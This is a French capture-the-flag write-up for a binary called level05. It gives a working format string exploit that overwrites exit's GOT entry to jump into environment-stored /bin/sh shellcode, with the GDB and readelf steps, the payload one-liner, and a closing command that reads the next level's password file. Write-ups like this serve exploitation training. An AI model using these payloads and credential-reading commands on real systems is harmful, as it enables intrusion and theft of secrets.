Ici notre binaire prend un input sur le stdin puis va utiliser toLower() sur notre chaine et va ensuite printf notre chaine directement en argument.

On peut utiliser un format string attack, overwrite l'adresse de exit dans le GOT et le remplacer par un shellcode fourni dans notre environment.

tout d'abord exportont notre Nop-Sled
` export SHELLCODE=`python -c "print('\x90'*1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"` `

Sachant que les adresse contenant l'environment se situe 16 bits au dessus de EBP nous pouvont trouver l'adresse de notre shellcode en utilisant GDB.

``` 
x $ebp+0x10
x 0xffffd39c
x/128w 0xffffd4db

```

On retrouve bien notre Nop-Sled ( \x90 .... )
On va donc choisir une adresse dans notre Nop-Sled afin de placer celle-ci dans le GOT
ce sera 0xffffd64b

Maintenant on veut l'adresse du GOT

` readelf -r ./level05 `
Ce qui nous donne 0x080497e0

Nous devons donc ecrire 0xffffd64b dans 0x080497e0 mais 0xffffd64b vaut 4294956619 ce qui est plus que le int max, donc nous ne pouvons pas utiliser %4294956619d.
On va devoir ecrire en 2x dans notre adresse d'abord a 0x080497e0 et apres 0x080497e2.
On ecrit la parti basse 0xd64b puis la parti haute 0xffff, mais pour finir il nous faut l'emplacement du buffer.

` python -c "print('AAAA' + ' %p '*13)" | ./level05 `

Notre buffer est le 10eme emplacement ( %10\$p )

` python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%10\$p' + ' %11\$p')" | ./level05 `

Enfin nous voulons ecrire en premier 0xd64b soit 54859 ( attention a bien enlever 8 car nous ecrivont 2 adresse avant ) avec %54859d%10\$hn a noter que l'on utilise h c'est un lenght modifier de printf signifiant half alias short car on souhaite dans notre cas ecrire que 2 byte.

et pour ecrire 0xffff on doit ecire 65535, sachant que nous avons deja ecrit 54859 caractere ils nous reste que 10676 a ecrire
` 65535 - 54859 = 10676 `
En utilisant %10676d11\$hn

On rajoute cat a la fin pour garder le stdin ouvert et nous obtenons:

` (python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' '%54851d%10\$hn' + '%10676d%11\$hn')"; cat) | ./level05 `

` cat /home/users/level06/.pass `
